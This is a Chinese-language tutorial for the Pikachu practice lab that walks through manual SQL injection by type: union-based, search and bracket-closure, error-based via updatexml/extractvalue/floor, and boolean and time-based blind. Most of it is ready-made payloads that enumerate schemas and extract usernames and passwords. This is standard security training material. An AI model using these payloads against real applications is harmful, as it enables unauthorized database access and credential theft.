在将代码之前先看一下普通sql注入步骤

手工注入常规思路

1.判断是否存在注入，注入是字符型还是数字型

2.猜解SQL查询语句中的字段数

3.确定回显位置

4.获取当前数据库

5.获取数据库中的表

6.获取表中的字段名

7.得到数据

数字型

进入界面后发现是post发包，所以就打开burpsuit进行抓包

进行初次测

1’

1 and 1=2

1 or 1=1

经初步测试确定是字符型。

#猜解SQL查询语句中的字段数
1 union select 1,2
#获取当前数据库
1 union select 1,database()
#获取数据库中的表
1 union select null,table_name from information_schema.tables     where table_schema=database() limit 0,3 
#获取表中的字段名
1 union select null,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='member' 
#得到数据
1 union select username,pw from users

字符型注入

进入之后随便输入并回车，发现在url中疑似存在sql注入点

先进行初步测试

kobe’

kobe’ #

kobe’ or ‘1’=’1

kobe’ or 1=1 #

经初步测试确定是字符型。

#猜解SQL查询语句中的字段数
1' union select 1,2#
#获取当前数据库
1' union select 1,database()#
#获取数据库中的表
1' union select null,table_name from information_schema.tables     where table_schema=database() limit 0,5 #
#获取表中的字段名，一起输出
1' union select null,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='member' #
#获取表中的字段名，条输出
1' union select 1,COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='member' #
#得到数据
1' union select username,pw from member #

搜索型注入

关于搜索型注入，我们现需要理解好sql搜索

搜索型测试：
select id,username,pw from member where username like ‘%k%’

所以我们需要闭合%’ 然后再注释掉后边的内容。

或者手动添加’% 也可，如：kobe%’ union select 1,database(),3 ‘% 这里的'%会自动闭合后边的%'

(注：关于自己手动闭合问题，这里只是我突然想到的一个问题然后提到。如果实在不理解建议使用# 注释掉后边内容)

#猜解SQL查询语句中的字段数
1%' union select 1,2,3#
#获取当前数据库
1%' union select 1,version(),database()#
#获取数据库中的表
1%' union select 1,null,table_name from information_schema.tables where table_schema=database() limit 0,5 #
下面这条也可
kobe' union select 1,table_schema,table_name from information_schema.tables where table_schema='pikachu'#
#获取表中的字段名，一起输出
1%' union select 1,null,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='member' #
#获取表中的字段名，条输出
1%' union select 1,2,COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='member' #
#得到数据
1%' union select id,username,pw from member #

xx型注入

xx型注入指的是非常规sql语句闭合，如下面所示（这是pikachu xx型注入的源码）

select id,email from member where username=(‘$name’)

根句源码可知，我们需要先闭合’)再去构造sql注入语句。

#猜解SQL查询语句中的字段数
1') union select 1,2#
#获取当前数据库
1') union select 1,database()#
#获取数据库中的表
1') union select null,table_name from information_schema.tables     where table_schema=database() limit 0,5 #
#获取表中的字段名，一起输出
1') union select null,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='member' #
#获取表中的字段名，条输出
1') union select 1,COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='member' #
#得到数据
1') union select username,pw from member #

insert/update注入

insert/update注入又叫报错注入，意思是使用mysql内置函数使用报错执行攻击sql代码。

在insert/update注入不同于之间查找搜索注入，因为insert/update本身就是一个sql插入语句，不能进行联合查询。

1’ or sql注入语句 （这里使用报错注入） or ‘

基于报错的信息获取-三个常用的用来报错的函数

  • updatexml():函数是MYSQL对XML文档数据进行查询和修改的XPATH函数。

  • floor(): MYSQL中用来取整的函数。

  • extractvalue():函数也是MYSQL对XML文档数据进行查询的XPATH函数。

1. UPDATEXML (xml_document, XPathstring, new_value)

使用格式。（注：普通sql注入语句处可以替换任意select查询）

updatexml(1, concat( 0x7e, ( 普通sql注入语句 ) ) ,0) 

#0x7e是这个~符号
xiaohong' or     updatexml(1,concat(0x7e,database()),0)        or ' 
#一条一条获取表的名字
' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu' )),0) or'


#（注：字符少的时候用， 字符太多时无法获取完全，因为你报错会限制字符输出个数）
' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='pikachu' limit 0,1)),0) or'
#用取字符串的方式来取第32位之后的字符串  (注：取字符串的方式有很多，这里我仅一举例，你可以换自己喜欢的)
' or updatexml(1,concat(0x7e,  SUBSTRING(  (select group_concat(table_name) from information_schema.tables where table_schema='pikachu' limit 0,1 ),25,32)   ),0) or '


#一条一条获取字段的名字
'or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='member' limit 0,1)),0) or'
#（注：字符少的时候用， 字符太多时无法获取完全，因为你报错会限制字符输出个数）
' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='member')),0) or'
#用取字符串的方式来取第32位之后的字符串  (注：取字符串的方式有很多，这里我仅一举例，你可以换自己喜欢的)
' or updatexml(1,concat(0x7e,SUBSTRING((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='member'),25,32)),0) or'


#获取内容 单个逐条获取
' or updatexml(1,concat(0x7e,  (select password from users limit 0,1 )  ),0) or '
#获取内容（注：这里用了取字符串的形来取）
' or updatexml(1,concat(0x7e,  SUBSTRING( (select group_concat(username,password) from users ),1,32)  ),0) or '
#获取内容 （注：分组单个逐条获取，用取字符串的形式）
'or updatexml(1,concat( 0x7e,        SUBSTRING( (      select group_concat( '----', id,'----',username,'----',password) from users  GROUP BY username limit 1,1     ),1,32)   ),0)  or'

2. ExtractValue(xml_document, xpath_string)

使用格式。（注：普通sql注入语句处可以替换任意select查询）

extractvalue(0, concat( 0x7e, ( 普通sql注入语句 ) ))

具体详细用法参见updatexml,自行更改用法

*3. floor()函数 *

rand()的结果不可以作为order by的条件字段，也不可以作为group by的。使用floor()报错，需要count(*)，rand()、group by，三者缺一不可

使用格式。（注：普通sql注入语句处可以替换任意select查询）

(select 2 from (select count(),concat( ( 普通sql注入语句 ) ,floor(rand(0)2))x from information_schema.tables group by x)a)

具体详细用法参见updatexml,自行更改用法

布尔型注入

获取数据库的总数

获取当前数据库长度

获取当前数据库内容

获取当前数据库表的总数

获取当前数据库表的长度

获取当前数据库表的内容

获取当前数据库表的字段总数

获取当前数据库表的字段第N个长度

获取当前数据库表的字段第N个内容

获取内容

(额，可能皮卡丘报错回显有些特殊，这个当假命题才会有正确回显，所以注意一下)

#这里他的数据库其实是“pikachu”是7个字符，但是上边有提到刚好是假命题时才有正确回显
kobe' or length(database())>7  #
#获取数据库名字
kobe' or ord(mid(database(),1,1))>112#           ascii=112 = p
#获取第一个表名字的长度（一个一个获取）
kobe' OR (select count(table_name) from information_schema.tables where table_schema=database())>5 #
#获取第一个表（一个一个获取）
grady' or ord( mid((select table_name from information_schema.TABLES where table_schema='pikachu' limit 0,1),1,1))>104 #        ascii=104 = h
#获取字段总数（一个一个获取）
kobe' or ( select count(column_name) from information_schema.columns where table_name='member')>7 #
#获取第字段的长度（一个一个获取）
kobe' or   (select length((select column_name from information_schema.columns where table_name='member' limit 0,1)))>2 #
获取字段内容（一个一个获取）
kobe' or  ord( mid((select column_name from information_schema.columns where table_name='member' limit 0,1 ),1,1))>105 #       ascii=105 = i
#获取内容长度（一个一个获取）
kobe' or (select length(concat(id,username)) from member limit 0,1)>6 #
#获取内容信息（一个一个获取）
kobe' or  ord( mid((select username from member  limit 0,1 ),1,1))>118 #  ascii= 118 =v

时间型盲注

#获取有多少数据库   （注意：这里是依据我自己的数据库数量来的，我总共有8个数据库）
#此句执行时间不间隔，立即执行。因为，if判断为真，则执行0秒，若为假则执行3秒。 
kobe' and sleep(if((select count(schema_name) from information_schema.schemata )=8,0,3)) #
#此句执行时间间隔为5秒。因为，if判断为真，则执行sleep(5)，若为假则执行null。 
kobe' and if(  (substr(database(),1,1)  )='p', sleep(5) , null )  #

具体详细用法参见布尔注入,自行更改用法
